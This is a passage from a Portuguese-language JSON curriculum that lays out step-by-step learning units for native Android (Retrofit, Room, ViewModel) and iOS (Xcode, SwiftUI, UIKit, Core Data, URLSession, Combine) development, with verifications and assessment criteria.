                              "practicalExample": "Desenvolva um app de lista de tarefas: MainActivity com BottomNavigation para ListFragment (RecyclerView de tarefas) e DetailFragment (edição de tarefa). Use Navigation Component para transições, passe ID da tarefa via Safe Args, e ViewModel para persistir dados com Room DB. Gerencie ciclo de vida para salvar estado ao rotacionar.",
                              "finalVerifications": [
                                "App compila e roda sem crashes em emulador e dispositivo.",
                                "Navegação entre Activities e Fragments funciona bidirecionalmente.",
                                "Dados são passados corretamente e persistem no ciclo de vida.",
                                "Não há memory leaks detectados no Profiler.",
                                "UI responde a rotações e back button corretamente.",
                                "Logs confirmam chamadas corretas de lifecycle methods."
                              ],
                              "assessmentCriteria": [
                                "Código Kotlin limpo, idiomático com corrotinas se aplicável.",
                                "Uso correto de Navigation Component e Safe Args.",
                                "Gerenciamento impecável de ciclo de vida sem vazamentos.",
                                "Separação clara de concerns (ViewModel para lógica).",
                                "Tratamento de erros e estados de loading.",
                                "Testes unitários para ViewModels (opcional mas valorizado)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Orientada a Objetos (herança em Activities/Fragments).",
                                "Arquitetura MVVM (ViewModel, LiveData/Flow).",
                                "Design de UI/UX (navegação intuitiva com Material Design).",
                                "Persistência de Dados (integração com Room ou SharedPreferences).",
                                "Testes e Debugging (JUnit, Espresso para UI)."
                              ],
                              "realWorldApplication": "Em apps como Instagram ou WhatsApp, Activities gerenciam telas principais com BottomNav, Fragments exibem feeds/stories com navegação suave, ViewModels compartilham dados de usuário/API, e ciclo de vida garante que likes/comentários não sejam perdidos ao rotacionar ou minimizar o app."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.4",
                            "name": "Integração com APIs e Persistência de Dados",
                            "description": "Uso de Retrofit para chamadas HTTP, Room para banco de dados local e ViewModel para gerenciamento de estado em aplicações Android nativas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Retrofit para Chamadas HTTP",
                                  "subSteps": [
                                    "Adicionar dependências do Retrofit, Gson e OkHttp no build.gradle (Module: app).",
                                    "Criar uma interface para as APIs com anotações @GET, @POST, @Query e @Body.",
                                    "Implementar um RetrofitClient singleton ou usar injeção de dependência para instanciar o Retrofit.",
                                    "Testar uma chamada simples com enqueue() e callback para verificar resposta da API.",
                                    "Adicionar interceptores para logging e headers de autenticação."
                                  ],
                                  "verification": "Executar a app e verificar logs no Logcat mostrando resposta JSON da API sem erros de rede.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Android Studio",
                                    "Documentação Retrofit: https://square.github.io/retrofit/",
                                    "API pública como JSONPlaceholder"
                                  ],
                                  "tips": "Use Retrofit.Builder com baseUrl terminando em '/' para evitar erros de path.",
                                  "learningObjective": "Entender como mapear endpoints REST para interfaces Kotlin e gerenciar chamadas assíncronas.",
                                  "commonMistakes": "Esquecer de adicionar internet permission no AndroidManifest.xml; não converter response para data class."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Room para Persistência Local",
                                  "subSteps": [
                                    "Adicionar dependências Room (runtime, compiler, ktx) no build.gradle.",
                                    "Definir Entity com @Entity, @PrimaryKey e colunas anotadas.",
                                    "Criar Dao com @Dao, @Insert, @Update, @Query e @Delete.",
                                    "Definir Database abstrata com @Database, incluindo entidades e DAOs.",
                                    "Testar inserção e query básica em um teste unitário ou ViewModel simples."
                                  ],
                                  "verification": "Inserir dados via Room e query-los; verificar no Device File Explorer que o banco foi criado em /data/data/app/databases.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Android Studio",
                                    "Documentação Room: https://developer.android.com/training/data-storage/room",
                                    "Kotlin Coroutines para async"
                                  ],
                                  "tips": "Use @TypeConverters para tipos complexos como List ou Date.",
                                  "learningObjective": "Modelar dados locais com entidades relacionais e operações CRUD assíncronas.",
                                  "commonMistakes": "Não anotar kapt no build.gradle; esquecer @Transaction para operações compostas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar ViewModel e Repository Pattern",
                                  "subSteps": [
                                    "Criar Repository classe que encapsule Retrofit e Room calls.",
                                    "Implementar ViewModel com viewModelScope.launch para chamadas assíncronas e MutableLiveData/StateFlow para estado.",
                                    "No Repository, combinar API fetch com cache local (ex: fetch API, save to Room, return from Room).",
                                    "Expor funções como getData() que retorna LiveData<List<Data>>.",
                                    "Adicionar tratamento de erros com try-catch e Result wrapper."
                                  ],
                                  "verification": "Observe mudanças no LiveData/StateFlow no Observer da Activity e confirme dados carregados de API e salvos localmente.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Documentação ViewModel: https://developer.android.com/topic/libraries/architecture/viewmodel",
                                    "StateFlow/LiveData guides"
                                  ],
                                  "tips": "Prefira StateFlow para Compose ou novas apps; use Repository para desacoplar camadas.",
                                  "learningObjective": "Gerenciar ciclo de vida e estado reativo com ViewModel e Repository para arquitetura MVVM.",
                                  "commonMistakes": "Não usar viewModelScope levando a leaks; ignorar loading/error states."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Tudo em uma Activity/Fragment",
                                  "subSteps": [
                                    "No onCreate da Activity, obter ViewModel via ViewModelProvider.",
                                    "Configurar Observer no LiveData/StateFlow para atualizar RecyclerView.",
                                    "Implementar refresh/pull-to-refresh chamando ViewModel function.",
                                    "Adicionar suporte offline: query Room primeiro, sync com API em background.",
                                    "Testar cenários: online/offline, erro de rede, dados persistidos após restart."
                                  ],
                                  "verification": "Rodar app, simular perda de rede (airplane mode), confirmar dados offline; reiniciar app e dados persistem.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Exemplo app com RecyclerView",
                                    "Permissions para internet e network state"
                                  ],
                                  "tips": "Use WorkManager para sync background se necessário.",
                                  "learningObjective": "Construir fluxo completo de dados: API -> Repository -> Room -> UI com estado persistente.",
                                  "commonMistakes": "Não unregister observers; UI updates na main thread sem corrotinas."
                                }
                              ],
                              "practicalExample": "Desenvolva um app 'UserList' que busca usuários de https://jsonplaceholder.typicode.com/users via Retrofit, salva no Room DB, exibe em RecyclerView via ViewModel. Suporte offline mostrando cache e sync automático ao reconectar.",
                              "finalVerifications": [
                                "App faz chamadas HTTP bem-sucedidas e parseia JSON corretamente.",
                                "Dados são persistidos no Room e acessíveis offline.",
                                "ViewModel gerencia estados (loading, success, error) sem crashes em rotation/restart.",
                                "Tratamento de erros de rede com mensagens user-friendly.",
                                "Performance: lista carrega suavemente sem ANRs.",
                                "Código segue MVVM com separação clara de concerns."
                              ],
                              "assessmentCriteria": [
                                "Correção funcional: API, DB e UI integrados sem bugs.",
                                "Qualidade de código: Uso de corrotinas, data classes, anotações corretas.",
                                "Tratamento de edge cases: empty data, no internet, invalid JSON.",
                                "Eficiência: chamadas lazy, cache efetivo, sem memory leaks.",
                                "Documentação: comentários em código crítico e README com setup.",
                                "Testabilidade: pelo menos 2 unit tests para Repository."
                              ],
                              "crossCurricularConnections": [
                                "Redes e Protocolos: Entender HTTP/REST e segurança (HTTPS, auth).",
                                "Banco de Dados: Modelagem relacional e SQL queries via Room.",
                                "Arquitetura de Software: Padrões MVVM, Repository e SOLID principles.",
                                "Programação Assíncrona: Corrotinas vs Callbacks em Kotlin."
                              ],
                              "realWorldApplication": "Em apps como Instagram ou Uber, onde dados de feed/posts são buscados de APIs backend, cacheados localmente para uso offline e sincronizados, garantindo UX fluida mesmo em conexões ruins."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.2",
                        "name": "Desenvolvimento Nativo para iOS com Swift",
                        "description": "Foco na linguagem Swift para criação de aplicativos nativos iOS no Xcode, explorando UIKit, SwiftUI, Auto Layout e integração com frameworks do iOS como Core Data.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.2.1",
                            "name": "Configuração do Ambiente Xcode e Swift Playground",
                            "description": "Instalação do Xcode, criação de projeto iOS single-view e experimentação inicial com Swift Playgrounds para sintaxe básica.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Baixar e Instalar o Xcode",
                                  "subSteps": [
                                    "Verifique se seu Mac roda macOS Ventura ou superior (Preferências do Sistema > Geral > Sobre).",
                                    "Abra a Mac App Store e busque por 'Xcode'.",
                                    "Clique em 'Obter' ou 'Atualizar' (requer Apple ID gratuito).",
                                    "Aguarde o download (pode levar 30-60 minutos dependendo da conexão).",
                                    "Abra o Xcode pela primeira vez para completar a instalação adicional (Command Line Tools)."
                                  ],
                                  "verification": "O Xcode abre exibindo a tela de boas-vindas sem erros de instalação.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Mac com macOS Ventura+, conexão à internet estável, pelo menos 20GB de espaço livre em disco"
                                  ],
                                  "tips": "Faça login com uma Apple ID associada a um desenvolvedor gratuito para acessar simuladores.",
                                  "learningObjective": "Instalar corretamente o IDE oficial da Apple para desenvolvimento iOS.",
                                  "commonMistakes": [
                                    "Baixar versão beta instável",
                                    "Ignorar requisitos de espaço em disco",
                                    "Não instalar Command Line Tools na primeira abertura"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar um Novo Projeto iOS Single View App",
                                  "subSteps": [
                                    "Abra o Xcode e selecione 'Create a new Xcode project'.",
                                    "Escolha 'iOS' > 'App' > 'Next' (selecione UIKit para Single View App).",
                                    "Defina Interface: Storyboard, Language: Swift, nomeie o projeto (ex: MeuPrimeiroApp), salve em uma pasta organizada.",
                                    "Clique em 'Create' e aguarde o indexing inicial.",
                                    "Execute o projeto no simulador (Cmd+R) para ver a tela vazia."
                                  ],
                                  "verification": "O projeto compila e roda no simulador iPhone mostrando uma view branca sem crashes.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Xcode instalado",
                                    "Pasta dedicada para projetos"
                                  ],
                                  "tips": "Use o simulador iPhone 15 para testes iniciais; evite dispositivos reais por enquanto.",
                                  "learningObjective": "Configurar estrutura básica de um app iOS nativo com UIKit.",
                                  "commonMistakes": [
                                    "Selecionar SwiftUI em vez de UIKit para single-view",
                                    "Nomear projeto com espaços ou caracteres especiais",
                                    "Não salvar em pasta versionada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar e Explorar Swift Playgrounds para Sintaxe Básica",
                                  "subSteps": [
                                    "Baixe 'Swift Playgrounds' na Mac App Store (gratuito).",
                                    "Abra o app e crie um novo Playground em branco (File > New > Playground).",
                                    "Escreva e execute código básico: variáveis (let x = 5), print('Hello World'), funções simples.",
                                    "Experimente loops (for i in 1...5 { print(i) }) e condicionais (if x > 3 { print(\"Maior\") }).",
                                    "Salve o playground e teste resultados em tempo real."
                                  ],
                                  "verification": "Códigos executam instantaneamente no Playground sem erros de sintaxe, exibindo saídas corretas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Swift Playgrounds app",
                                    "Mac App Store"
                                  ],
                                  "tips": "Playgrounds são ideais para prototipagem rápida; resultados aparecem em tempo real à direita.",
                                  "learningObjective": "Dominar sintaxe Swift básica de forma interativa e visual.",
                                  "commonMistakes": [
                                    "Confundir let (imutável) com var (mutável)",
                                    "Esquecer ponto-e-vírgula desnecessário no Swift",
                                    "Não indentar corretamente blocos de código"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Experimentação Inicial e Integração no Projeto Xcode",
                                  "subSteps": [
                                    "No projeto iOS, abra ViewController.swift e adicione um UILabel via code ou Storyboard.",
                                    "Copie sintaxe básica do Playground para o projeto (ex: override func viewDidLoad() { super.viewDidLoad(); print(\"App rodando!\") }).",
                                    "Adicione um botão simples que printa mensagem no console ao tocar.",
                                    "Compile e rode no simulador, verificando console (View > Debug Area > Activate Console).",
                                    "Salve tudo e commite em Git se configurado (Source Control > Commit)."
                                  ],
                                  "verification": "App roda com prints no console e elementos visuais funcionais sem warnings.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Projeto Xcode criado",
                                    "Conhecimento de Playground"
                                  ],
                                  "tips": "Use Cmd+Shift+O para buscar arquivos rapidamente no Xcode.",
                                  "learningObjective": "Aplicar sintaxe Swift básica em um app real e depurar via console.",
                                  "commonMistakes": [
                                    "Não chamar super.viewDidLoad()",
                                    "Esquecer import UIKit",
                                    "Ignorar warnings amarelos no build"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure o ambiente para criar um app simples de 'Hello World' com botão: instale Xcode, crie single-view app, use Playground para testar print e variáveis, integre no ViewController para mostrar texto dinâmico no label ao tocar botão.",
                              "finalVerifications": [
                                "Xcode abre e cria projetos sem erros de instalação.",
                                "Projeto iOS single-view compila e roda no simulador em menos de 10 segundos.",
                                "Swift Playground executa 5+ snippets de sintaxe básica (variáveis, loops, condicionais).",
                                "Console do Xcode mostra prints corretos do app rodando.",
                                "Nenhum erro ou warning crítico no build final.",
                                "Ambiente pronto para adicionar Git e bibliotecas."
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem intervenção manual adicional.",
                                "Projeto segue template UIKit single-view corretamente.",
                                "Sintaxe Swift básica aplicada sem erros de compilação.",
                                "Uso eficaz de simulador e console para depuração.",
                                "Tempo total de configuração inferior a 3 horas.",
                                "Documentação pessoal de passos realizados (prints ou notas)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Fundamental: Variáveis, controle de fluxo em Swift (conecta com Python/Java).",
                                "Gerenciamento de Ambientes: Instalação de IDEs (similar a VS Code para web dev).",
                                "UI/UX Design: Primeiros passos com Storyboard e views nativas.",
                                "Versionamento: Preparação para Git no Xcode (engenharia de software).",
                                "Computação em Nuvem: Apple ID para distribuição futura de apps."
                              ],
                              "realWorldApplication": "Desenvolvedores iOS profissionais configuram assim diariamente para criar apps nativos como WhatsApp ou Uber, permitindo builds rápidos, testes em simuladores e deployment na App Store para milhões de usuários."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.2",
                            "name": "Desenvolvimento de Interfaces com SwiftUI e UIKit",
                            "description": "Construção de views com SwiftUI para UIs declarativas e Storyboards com Auto Layout no UIKit para layouts responsivos em diferentes dispositivos iOS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e fundamentos do SwiftUI",
                                  "subSteps": [
                                    "Instalar a versão mais recente do Xcode e criar um novo projeto iOS com interface SwiftUI",
                                    "Explorar a estrutura básica de uma SwiftUI View, incluindo o body e pré-visualização no Canvas",
                                    "Adicionar elementos básicos como Text, Image e Button, aplicando modificadores como .padding() e .frame()",
                                    "Implementar estado reativo com @State para atualizar a UI dinamicamente",
                                    "Executar o app no simulador iPhone para validar a renderização inicial"
                                  ],
                                  "verification": "O app compila e exibe uma UI interativa simples no simulador sem erros de compilação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Xcode 15 ou superior",
                                    "Mac com macOS Sonoma ou posterior",
                                    "Documentação oficial SwiftUI da Apple"
                                  ],
                                  "tips": "Use o Live Preview no Xcode para iterações rápidas sem recompilar o app inteiro.",
                                  "learningObjective": "Dominar a sintaxe declarativa do SwiftUI e gerenciamento de estado básico.",
                                  "commonMistakes": [
                                    "Esquecer de declarar variáveis como @State",
                                    "Não importar o módulo SwiftUI",
                                    "Ignorar o uso de VStack/HStack para layout inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir interfaces declarativas avançadas com SwiftUI",
                                  "subSteps": [
                                    "Criar layouts compostos usando VStack, HStack e ZStack para organizar views hierarquicamente",
                                    "Implementar List e NavigationStack para navegação e listas dinâmicas",
                                    "Adicionar animações com .animation() e transições suaves entre views",
                                    "Integrar formulários com Form, TextField e Toggle para entrada de dados",
                                    "Testar responsividade com diferentes modificadores como .ignoresSafeArea() e previews em múltiplos devices"
                                  ],
                                  "verification": "Navegação entre telas funciona fluidamente e a UI se adapta a diferentes tamanhos de tela no preview.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Xcode Playground para testes rápidos",
                                    "SwiftUI Tutorials da Apple",
                                    "Simuladores iPhone SE, 14 Pro e iPad"
                                  ],
                                  "tips": "Sempre use previews com diferentes configurações de device para detectar problemas de layout cedo.",
                                  "learningObjective": "Construir UIs complexas e responsivas usando componentes nativos do SwiftUI.",
                                  "commonMistakes": [
                                    "Aninhar muitos Stacks desnecessariamente afetando performance",
                                    "Não gerenciar identidades em Lists com id()",
                                    "Ignorar accessibility modifiers"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver interfaces com UIKit e Storyboards",
                                  "subSteps": [
                                    "Criar um novo storyboard no projeto e adicionar View Controllers via Interface Builder",
                                    "Conectar outlets e actions entre Storyboard e código Swift usando Assistant Editor",
                                    "Implementar UIView subclasses para views customizadas com draw(rect:)",
                                    "Configurar segues para navegação entre view controllers",
                                    "Executar e debugar o app no simulador para validar transições e interações"
                                  ],
                                  "verification": "Transições de segue funcionam corretamente e outlets respondem a eventos touch.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Xcode Storyboard editor",
                                    "Documentação UIKit da Apple",
                                    "Sample code de UIKit da developer.apple.com"
                                  ],
                                  "tips": "Use Size Classes no Interface Builder para previews iniciais de responsividade.",
                                  "learningObjective": "Entender o paradigma imperativo do UIKit e uso de Storyboards para prototipagem rápida.",
                                  "commonMistakes": [
                                    "Não strong reference outlets corretamente causando nil",
                                    "Conflitos de segue types",
                                    "Esquecer de setar delegate/datasource em tabelas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Auto Layout para layouts responsivos em UIKit e SwiftUI",
                                  "subSteps": [
                                    "No UIKit, adicionar Constraints via Interface Builder para pinning e relative positioning",
                                    "Configurar Auto Layout programaticamente com NSLayoutConstraint para cenários dinâmicos",
                                    "Em SwiftUI, usar Spacer, frame(maxWidth:) e GeometryReader para layouts adaptáveis",
                                    "Testar em múltiplos dispositivos e orientações usando simuladores variados",
                                    "Otimizar para performance medindo layout passes com Instruments"
                                  ],
                                  "verification": "UI mantém proporções e conteúdo visível em iPhone portrait/landscape e iPad split-view sem overlaps.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Xcode Instruments para profiling",
                                    "Auto Layout Guide da Apple",
                                    "Simuladores de vários devices iOS"
                                  ],
                                  "tips": "Priorize constraints de alta prioridade e use multipliers para escalabilidade.",
                                  "learningObjective": "Criar interfaces que se adaptam automaticamente a qualquer tamanho de tela iOS.",
                                  "commonMistakes": [
                                    "Ambiguidades em constraints levando a warnings",
                                    "Hardcoded frames em vez de constraints",
                                    "Não testar em trait collections diferentes"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar SwiftUI e UIKit e realizar testes finais",
                                  "subSteps": [
                                    "Usar UIHostingController para embedar SwiftUI views em UIKit hierarchies",
                                    "Implementar UIViewRepresentable para wrappers de UIKit em SwiftUI",
                                    "Executar testes unitários para views e snapshots com XCTest",
                                    "Validar accessibility e dark mode support em toda a UI",
                                    "Deploy para dispositivo físico para testes reais de performance"
                                  ],
                                  "verification": "Integração híbrida funciona sem crashes e app passa em todos os testes automatizados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Dispositivo iOS físico",
                                    "Xcode Test navigator",
                                    "WWDC sessions sobre SwiftUI-UIKit interop"
                                  ],
                                  "tips": "Comece com composição simples antes de wrappers complexos para evitar overhead.",
                                  "learningObjective": "Habilitar migrações híbridas e testes robustos em projetos reais.",
                                  "commonMistakes": [
                                    "Ciclos de retain em hosting controllers",
                                    "Ignorar trait changes em integrações",
                                    "Testes só em simulador sem device real"
                                  ]
                                }
                              ],
                              "practicalExample": "Construa um app de lista de tarefas (To-Do List) com SwiftUI para a tela principal (lista e adição de itens) e UIKit Storyboard para um modal de edição detalhada, garantindo que o layout seja responsivo em iPhone 14, iPhone SE e iPad Pro, com navegação suave e persistência via UserDefaults.",
                              "finalVerifications": [
                                "App roda sem crashes em simuladores e device físico para iPhone e iPad",
                                "Layouts se adaptam perfeitamente a rotações, split-view e tamanhos variados",
                                "Interações como botões, listas e navegação respondem corretamente",
                                "Dark mode e accessibility features (VoiceOver) funcionam em toda UI",
                                "Performance acima de 60 FPS em scrolls e animações, verificado com Instruments",
                                "Código compila sem warnings de Auto Layout ou deprecated APIs"
                              ],
                              "assessmentCriteria": [
                                "Uso eficiente de componentes nativos sem código boilerplate excessivo",
                                "Layouts 100% responsivos sem hard-coded valores",
                                "Código modular, comentado e seguindo Swift best practices (nomenclatura, previews)",
                                "Integração híbrida limpa sem memory leaks",
                                "Testes unitários cobrindo 80% das views e interações",
                                "Documentação inline explicando escolhas de SwiftUI vs UIKit"
                              ],
                              "crossCurricularConnections": [
                                "Design de UX/UI: Aplicação de princípios de design responsivo e Material Design adaptado",
                                "Programação Orientada a Objetos: Herança e protocolos em UIViewControllers",
                                "Desenvolvimento Web: Analogias com Flexbox/Grid em CSS para layouts SwiftUI",
                                "Qualidade de Software: Testes automatizados e profiling de performance",
                                "Gestão de Projetos: Prototipagem rápida com Storyboards vs código declarativo"
                              ],
                              "realWorldApplication": "No desenvolvimento de apps iOS profissionais como apps bancários (ex: Nubank), redes sociais (Instagram) ou e-commerce (Magazine Luiza), onde interfaces precisam ser intuitivas, responsivas em todos os devices Apple e permitir migrações graduais de UIKit legado para SwiftUI moderno, otimizando user experience e manutenção."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.3",
                            "name": "Gerenciamento de ViewControllers e Navegação",
                            "description": "Implementação de UIViewController, UINavigationController e modais; uso de protocols e delegates para comunicação entre views em Swift.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Implementação Básica de UIViewController",
                                  "subSteps": [
                                    "Criar um novo projeto iOS no Xcode usando SwiftUI ou UIKit.",
                                    "Adicionar uma classe personalizada herdando de UIViewController.",
                                    "Configurar outlets e actions no storyboard ou programaticamente.",
                                    "Implementar o método viewDidLoad para inicializar a view.",
                                    "Testar a view controller em um simulador."
                                  ],
                                  "verification": "A view controller carrega corretamente sem erros no simulador, exibindo elementos de UI básicos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Xcode 15+",
                                    "Documentação Apple sobre UIViewController"
                                  ],
                                  "tips": "Sempre chame super.viewDidLoad() no override.",
                                  "learningObjective": "Compreender e criar ViewControllers personalizados para gerenciar telas individuais.",
                                  "commonMistakes": [
                                    "Esquecer de conectar outlets no storyboard",
                                    "Não importar UIKit",
                                    "Ignorar ciclos de vida da view"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configuração de UINavigationController para Navegação em Pilha",
                                  "subSteps": [
                                    "Definir o UINavigationController como root view controller no AppDelegate ou SceneDelegate.",
                                    "Criar uma view controller inicial e push para uma segunda via botão.",
                                    "Configurar barra de navegação com título, botões de navegação e itens personalizados.",
                                    "Implementar pop para voltar e popToRoot para retornar à tela inicial.",
                                    "Personalizar transições de navegação."
                                  ],
                                  "verification": "Navegação push/pop funciona suavemente com barra de navegação visível e funcional.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Xcode",
                                    "Documentação UINavigationController"
                                  ],
                                  "tips": "Use navigationItem para customizar a barra sem subclassing.",
                                  "learningObjective": "Dominar a navegação hierárquica usando pilha de view controllers.",
                                  "commonMistakes": [
                                    "Não setar navigationController como root",
                                    "Push sem animação desnecessária",
                                    "Barra oculta acidentalmente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Apresentação de ViewControllers Modais",
                                  "subSteps": [
                                    "Preparar uma view controller modal com tamanho full ou customizado.",
                                    "Apresentar modal usando present(_:animated:completion:).",
                                    "Configurar dismiss com botão ou gesto de swipe.",
                                    "Implementar estilos de apresentação (sheet, pageSheet, fullScreen).",
                                    "Adicionar suporte a Dark Mode e adaptação de tamanho."
                                  ],
                                  "verification": "Modal apresenta e dismiss corretamente com animações suaves em diferentes dispositivos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Xcode",
                                    "Human Interface Guidelines da Apple"
                                  ],
                                  "tips": "Use .modalPresentationStyle para controlar o comportamento.",
                                  "learningObjective": "Implementar overlays modais para fluxos temporários como formulários.",
                                  "commonMistakes": [
                                    "Não chamar super.viewWillAppear",
                                    "Modal não dismissível",
                                    "Ignorar safe areas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comunicação entre Views usando Protocols e Delegates",
                                  "subSteps": [
                                    "Definir um protocol com métodos para comunicação (ex: didSelectItem).",
                                    "Implementar o delegate na view controller de destino.",
                                    "Passar self como delegate ao apresentar ou push a view.",
                                    "Chamar métodos do delegate no destino e tratar na origem.",
                                    "Evitar retain cycles usando weak delegate."
                                  ],
                                  "verification": "Dados ou ações são passados corretamente entre views sem crashes ou vazamentos de memória.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Xcode",
                                    "Documentação sobre Protocols e Delegation"
                                  ],
                                  "tips": "Sempre marque delegates como weak para evitar retain cycles.",
                                  "learningObjective": "Estabelecer comunicação desacoplada e segura entre múltiplos view controllers.",
                                  "commonMistakes": [
                                    "Delegate strong causando retain cycle",
                                    "Protocol não adotado corretamente",
                                    "Chamada de delegate nula"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um app de lista de tarefas: tela inicial com UINavigationController listando tarefas (UITableView). Push para detalhes da tarefa. Botão '+' apresenta modal para adicionar nova tarefa, usando delegate para passar o texto de volta à lista e recarregar dados.",
                              "finalVerifications": [
                                "Criar e gerenciar múltiplos UIViewControllers sem erros.",
                                "Navegação push/pop e modais funcionam com transições fluidas.",
                                "Comunicação via delegates passa dados corretamente sem vazamentos.",
                                "App adapta-se a diferentes tamanhos de tela e modos (light/dark).",
                                "Código segue padrões MVC com delegates weak.",
                                "Sem crashes ao navegar rapidamente ou dismiss modais."
                              ],
                              "assessmentCriteria": [
                                "Código limpo, comentado e indentado corretamente.",
                                "Uso eficiente de ciclos de vida de views.",
                                "Ausência de retain cycles detectados pelo Instruments.",
                                "UI responsiva e acessível (VoiceOver compatível).",
                                "Performance: navegação < 0.2s sem lags.",
                                "Conformidade com HIG da Apple."
                              ],
                              "crossCurricularConnections": [
                                "Design de UI/UX: Princípios de navegação intuitiva.",
                                "Arquitetura de Software: Padrão MVC e Delegation.",
                                "Gestão de Estado: Passagem de dados entre telas.",
                                "Testes e Debugging: Uso de Instruments para memory leaks.",
                                "Acessibilidade: Suporte a Dynamic Type e VoiceOver."
                              ],
                              "realWorldApplication": "Em apps como Instagram (navegação por feed > perfil via push, modais para stories) ou Banco do Brasil (telas de transações com modais de confirmação), garantindo UX fluida e comunicação segura de dados entre telas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.4",
                            "name": "Persistência e Chamadas de Rede em iOS",
                            "description": "Integração com Core Data para armazenamento local, URLSession para APIs REST e Combine para programação reativa em aplicativos Swift.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Persistência Local com Core Data",
                                  "subSteps": [
                                    "Criar um novo projeto Xcode com Core Data ativado.",
                                    "Definir o modelo de dados (Entity) no arquivo .xcdatamodeld, adicionando atributos como id, nome e data.",
                                    "Gerar as classes NSManagedObject via Editor > Create NSManagedObject Subclass.",
                                    "Implementar métodos para salvar e buscar entidades usando o contexto de Core Data.",
                                    "Testar inserção e recuperação de dados em um ViewController."
                                  ],
                                  "verification": "Executar o app e verificar se dados inseridos persistem após reiniciar o simulador.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Xcode 15+, Documentação Core Data da Apple, Playground para testes iniciais",
                                  "tips": "Sempre use contextos background para operações pesadas para evitar bloqueio da UI.",
                                  "learningObjective": "Dominar a configuração e operações CRUD básicas com Core Data em Swift.",
                                  "commonMistakes": "Esquecer de salvar o contexto (context.save()), usar main context para operações longas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Chamadas de Rede com URLSession para APIs REST",
                                  "subSteps": [
                                    "Definir estruturas Codable para models de request/response JSON.",
                                    "Criar uma função assíncrona usando URLSession.shared.dataTask para GET/POST.",
                                    "Adicionar headers de autenticação e tratamento de erros HTTP (status codes).",
                                    "Implementar JSONDecoder para decodificar respostas em arrays de models.",
                                    "Integrar com DispatchQueue para updates na main thread."
                                  ],
                                  "verification": "Chamar a API e logar a resposta decodificada; testar com falhas de rede simuladas.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Xcode, Postman para testar APIs públicas (ex: JSONPlaceholder), Documentação URLSession",
                                  "tips": "Use async/await em iOS 15+ para simplificar; sempre valide URL components.",
                                  "learningObjective": "Realizar chamadas HTTP seguras e assíncronas para APIs REST.",
                                  "commonMistakes": "Não decodificar JSON corretamente (tipos mismatch), esquecer de cancelar tasks."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Introduzir Combine para Programação Reativa",
                                  "subSteps": [
                                    "Importar Combine e definir Publishers para streams de dados (ex: PassthroughSubject).",
                                    "Criar um ViewModel com @Published properties para estado reativo.",
                                    "Usar operators como .map, .decode, .sink para processar dados de rede.",
                                    "Gerenciar lifecycle com .store(in: Set) para evitar memory leaks.",
                                    "Integrar com SwiftUI usando $property para binding automático."
                                  ],
                                  "verification": "Observar mudanças em @Published e confirmar updates na UI sem código manual.",
                                  "estimatedTime": "2-3 horas",
